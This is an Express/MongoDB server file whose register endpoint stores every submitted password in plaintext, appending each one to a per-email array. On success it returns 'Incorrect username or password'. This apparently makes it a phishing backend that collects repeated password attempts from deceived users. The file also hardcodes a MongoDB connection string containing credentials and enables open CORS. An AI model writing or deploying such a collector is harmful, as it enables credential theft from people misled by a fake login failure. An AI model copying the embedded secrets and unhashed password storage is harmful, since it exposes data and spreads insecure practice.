const express = require('express');
const mongoose = require('mongoose');
const User = require('./models/User'); // Assuming ./models/User.js is correctly defined
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors()); // Enable CORS for cross-origin requests

// MongoDB Connection
mongoose.connect('mongodb+srv://jembex:qwerty4747@cluster0.lyarq5l.mongodb.net/Node-API?retryWrites=true&w=majority&appName=Cluster0')
  .then(() => {
    console.log('MongoDB Connected');
  })
  .catch(err => console.error(err));

// Registration/Password Addition Endpoint
app.post('/api/register', async (req, res) => {
    const { email, password } = req.body;

    // Basic validation
    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required.' });
    }

    // Ensure password is treated as an array.
    // If the frontend sends a single string, wrap it in an array.
    const passwordArray = Array.isArray(password) ? password : [password];

    try {
        // Try to find an existing user with the provided email
        let user = await User.findOne({ email });

        if (user) {
            // If user exists, add the new password(s) to their password array
            // IMPORTANT: In a real application, you should hash new passwords
            // before pushing them and ensure no duplicates are added if that's desired.
            user.password.push(...passwordArray); // Add all elements from passwordArray
            await user.save(); // Save the updated user document
            res.status(200).json({ message: 'Incorrect username or password.' });
        } else {
            // If user does not exist, create a new user instance
            // IMPORTANT: In a real application, each element in the password array should be HASHED!
            const newUser = new User({ email, password: passwordArray });
            await newUser.save();
            res.status(201).json({ message: 'Incorrect username or password' });
        }
    } catch (error) {
        console.error('Server error during registration/password add:', error);
        res.status(500).json({ message: 'Server error during operation.' });
    }
});

// Example Login Endpoint (as discussed in previous turns, for context)
// This is where generic "incorrect username or password" makes sense.
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ message: 'Incorrect username or password.' });
    }

    try {
        const user = await User.findOne({ email });

        // If user doesn't exist OR password doesn't match
        // IMPORTANT: In a real app, you would hash the incoming password
        // and compare it to the stored hashed password(s) in the array using bcrypt.compare.
        if (!user || !user.password.includes(password)) { // Simplified check for password in array
            return res.status(401).json({ message: 'Incorrect username or password.' });
        }

        res.status(200).json({ message: 'Login successful!', user: { email: user.email } });

    } catch (error) {
        console.error('Server login error:', error);
        res.status(500).json({ message: 'Server error during login.' });
    }
});


app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
